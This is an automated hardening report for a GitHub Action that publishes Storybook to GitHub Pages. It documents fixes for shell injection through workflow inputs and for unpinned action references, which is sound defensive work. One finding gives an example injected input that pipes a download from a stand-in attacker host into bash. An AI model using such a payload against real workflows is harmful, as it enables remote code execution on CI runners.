<!-- markdownlint-disable -->

# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.1** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The 'Build' step directly interpolates ${{ inputs.install_command }} and ${{ inputs.build_command }} inside a run: shell command block. GitHub Actions expands these expressions via YAML template substitution before the shell ever sees the string, so an attacker who controls the calling workflow's inputs can inject arbitrary shell commands (e.g., setting install_command to 'true; curl attacker.com | bash'). These values must never be interpolated directly in run: — they should be passed via env: variables and then double-quoted in the script.

Locations:

- `action.yaml:36`
- `action.yaml:37`

### unpinned-uses (severity: high)

Three uses: references in action.yaml use mutable tag or version refs instead of pinned 40-character commit SHAs, making the action vulnerable to supply-chain attacks if the upstream tag is moved or the repository is compromised:
- actions/checkout@v3 (mutable major-version tag)
- actions/upload-pages-artifact@v1.0.4 (mutable semver tag)
- actions/deploy-pages@v1 (mutable major-version tag)
Each should be pinned to a full SHA, e.g. actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3

Locations:

- `action.yaml:38`
- `action.yaml:44`
- `action.yaml:49`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses

**Notes:**

Fixed all findings in hardened/action/action.yaml:
1. script-injection / static-inline-injection: Moved ${{ inputs.install_command }} and ${{ inputs.build_command }} from the run: block into the step's env: block as INSTALL_COMMAND and BUILD_COMMAND. Each command is written to a temp file via printf and executed with `bash -eo pipefail` to preserve errexit semantics.
2. unpinned-uses: Pinned all three action references to full 40-char SHAs:
   - actions/checkout@v3 → @a37ce9120846195fa4ece8f58b268e6043cb2f26 # v3
   - actions/upload-pages-artifact@v1.0.4 → @a597aecd27af1cf14095ccaa29169358e3d91e28 # v1.0.4
   - actions/deploy-pages@v1 → @f27bcc15848fdcdcc02f01754eb838e44bcf389b # v1

